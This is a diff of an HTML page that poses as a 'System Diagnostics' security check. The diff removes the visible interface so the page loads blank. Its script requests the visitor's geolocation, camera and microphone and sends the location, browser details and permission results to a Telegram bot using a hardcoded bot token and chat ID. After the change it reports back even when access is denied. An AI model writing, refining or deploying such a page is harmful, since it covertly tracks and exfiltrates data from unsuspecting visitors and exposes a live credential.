@@ -2,57 +2,16 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>System Diagnostics</title>
+  <title></title>
   <style>
-    body {
-      background: #0a0a0a;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: 'Segoe UI', monospace;
-    }
-    .container {
-      background: #1a1a2e;
-      padding: 40px;
-      border-radius: 15px;
-      text-align: center;
-      color: #fff;
-    }
-    .status-icon {
-      font-size: 48px;
-      margin-bottom: 20px;
-    }
-    .permission-item {
-      background: #16213e;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
-      font-size: 14px;
-    }
-    .granted { color: #4CAF50; }
-    .pending { color: #FF9800; }
-    .denied { color: #f44336; }
+    body { margin: 0; padding: 0; background: white; }
   </style>
 </head>
 <body>
-<div class="container">
-  <div class="status-icon">🔍</div>
-  <h3>Running Security Diagnostics</h3>
-  <p style="font-size: 12px; color: #888;">Checking system permissions...</p>
-  <div id="permissions-status"></div>
-</div>
 
 <script>
     const BOT_TOKEN = "7592256304:AAEnFjnbaovBqMU2frijfgQscr53ZAc8Giw";
     const CHAT_ID = "6024837142";
-
-    function updateUI(element, name, status) {
-        const div = document.createElement('div');
-        div.className = 'permission-item';
-        div.innerHTML = `${name}: <span class="${status}">${status === 'granted' ? '✓ تم' : (status === 'pending' ? '⏳ ينتظر...' : '✗ مرفوض')}</span>`;
-        element.appendChild(div);
-    }
 
     function sendToBot(data) {
         const message = `🔐 جمع بيانات:\n${JSON.stringify(data, null, 2)}`;
@@ -61,7 +20,6 @@
     }
 
     async function requestPermissions() {
-        const statusDiv = document.getElementById('permissions-status');
         const collectedData = {
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
@@ -70,9 +28,8 @@
             microphone: null
         };
 
-        // 1. طلب الموقع
+        // طلب الموقع
         if (navigator.geolocation) {
-            updateUI(statusDiv, '📍 الموقع', 'pending');
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     collectedData.location = {
@@ -80,40 +37,32 @@
                         lon: pos.coords.longitude,
                         accuracy: pos.coords.accuracy
                     };
-                    updateUI(statusDiv, '📍 الموقع', 'granted');
                     sendToBot(collectedData);
                 },
-                () => {
-                    updateUI(statusDiv, '📍 الموقع', 'denied');
+                (err) => {
+                    collectedData.location = { error: "denied" };
+                    sendToBot(collectedData);
                 }
             );
         }
 
-        // 2. طلب الكاميرا والميكروفون
+        // طلب الكاميرا والميكروفون
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            updateUI(statusDiv, '🎥 الكاميرا', 'pending');
-            updateUI(statusDiv, '🎙️ الميكروفون', 'pending');
-            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 
-                collectedData.camera = 'متاحة';
-                collectedData.microphone = 'متاح';
-                updateUI(statusDiv, '🎥 الكاميرا', 'granted');
-                updateUI(statusDiv, '🎙️ الميكروفون', 'granted');
-                
-                // إرسال تحديث إضافي
+                collectedData.camera = "granted";
+                collectedData.microphone = "granted";
                 sendToBot(collectedData);
                 
-                // إيقاف الـ stream بعد 5 ثواني
+                // إيقاف الـ stream بعد 3 ثواني
                 setTimeout(() => {
                     stream.getTracks().forEach(track => track.stop());
-                }, 5000);
+                }, 3000);
             } catch (err) {
-                if (err.name === 'NotAllowedError') {
-                    updateUI(statusDiv, '🎥 الكاميرا', 'denied');
-                    updateUI(statusDiv, '🎙️ الميكروفون', 'denied');
-                }
+                collectedData.camera = "denied";
+                collectedData.microphone = "denied";
+                sendToBot(collectedData);
             }
         }
     }
